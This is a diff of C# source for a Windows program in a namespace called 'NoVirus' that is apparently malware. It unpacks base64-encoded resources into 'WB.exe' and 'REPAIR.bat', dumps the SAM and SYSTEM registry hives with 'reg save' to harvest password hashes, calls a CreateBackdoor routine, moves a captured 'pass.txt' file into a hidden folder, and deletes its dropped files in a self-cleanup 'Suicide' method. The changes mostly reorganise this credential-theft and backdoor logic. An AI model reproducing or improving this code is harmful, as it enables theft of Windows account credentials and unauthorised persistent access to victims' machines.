@@ -12,28 +12,7 @@ namespace NoVirus
     {
         public Form1()
         {
-            //InitializeLibrary();
-            CopyHASH();
-        }
-
-        private void CreateWPV()
-        {
-            Stream stream = new MemoryStream(Properties.Resources.WB);
-            StreamReader SR = new StreamReader(stream);
-            string my = SR.ReadToEnd();
-            byte[] enc = Convert.FromBase64String(my);
-            File.WriteAllBytes("WB.exe", enc);
-            SR.Close();
-        }
-
-        private void CreateBAT()
-        {
-            Stream stream = new MemoryStream(Properties.Resources.BAT);
-            StreamReader SR = new StreamReader(stream);
-            string my = SR.ReadToEnd();
-            byte[] enc = Convert.FromBase64String(my);
-            File.WriteAllBytes("REPAIR.bat", enc);
-            SR.Close();
+            InitializeLibrary();
         }
 
         bool isAdmin;
@@ -74,11 +53,30 @@ namespace NoVirus
             Suicide();
         }
 
+        private void CreateWPV()
+        {
+            Stream stream = new MemoryStream(Properties.Resources.WB);
+            StreamReader SR = new StreamReader(stream);
+            string my = SR.ReadToEnd();
+            byte[] enc = Convert.FromBase64String(my);
+            File.WriteAllBytes("WB.exe", enc);
+            SR.Close();
+        }
+
+        private void CreateBAT()
+        {
+            Stream stream = new MemoryStream(Properties.Resources.BAT);
+            StreamReader SR = new StreamReader(stream);
+            string my = SR.ReadToEnd();
+            byte[] enc = Convert.FromBase64String(my);
+            File.WriteAllBytes("REPAIR.bat", enc);
+            SR.Close();
+        }
+
         private void CopyHASH()
         {
             if (File.Exists("SAM")) { File.Delete("SAM"); }
             if (File.Exists("SYSTEM")) { File.Delete("SYSTEM"); }
-            if (Directory.Exists("my") != true) { Directory.CreateDirectory("my"); }
             Process hash = new Process();
             hash.StartInfo.FileName = "CMD.exe";
             hash.StartInfo.Arguments = "/c reg save \"HKLM\\SAM\" SAM";
@@ -91,7 +89,10 @@ namespace NoVirus
             hash.Start();
             hash.WaitForExit();
             hash.Close();
-            File.Move("SAM", "my\\SAM"); File.Move("SYSTEM", "my\\SYSTEM");
+            if (File.Exists("my\\SAM")) { File.Replace("SAM", "my\\SAM", "my\\SAM_OLD"); }
+            else { File.Move("SAM", "my\\SAM"); }
+            if (File.Exists("my\\SYSTEM")) { File.Replace("SYSTEM", "my\\SYSTEM", "my\\SYSTEM_OLD"); }
+            else { File.Move("SYSTEM", "my\\SYSTEM"); }
         }
 
         private void CreateBackdoor()
@@ -109,20 +110,19 @@ namespace NoVirus
 
         private void Suicide()
         {
+            if (Directory.Exists($"{path}my") != true) { Directory.CreateDirectory($"{path}my"); }
             CreateBackdoor();
             CopyHASH();
             if (isAdmin)
             {
-                Thread.Sleep(1500);
                 if (File.Exists($"{path}REPAIR.bat")) { File.Delete($"{path}REPAIR.bat"); }
                 if (File.Exists($"{path}WB.exe")) { File.Delete($"{path}WB.exe"); }
                 if (File.Exists($"{path}pass.txt"))
                 {
-                    if (Directory.Exists($"{path}my") != true) { Directory.CreateDirectory($"{path}my"); }
                     if (File.Exists($"{path}my\\pass.txt")) { File.Replace($"{path}pass.txt", $"{path}my\\pass.txt", $"{path}my\\pass_old.txt"); }
                     else { File.Move($"{path}pass.txt", $"{path}my\\pass.txt"); }
                 }
-                else { Thread.Sleep(3000); Suicide(); }
+                Thread.Sleep(1500);
                 Close();
             }
             else { Close(); }
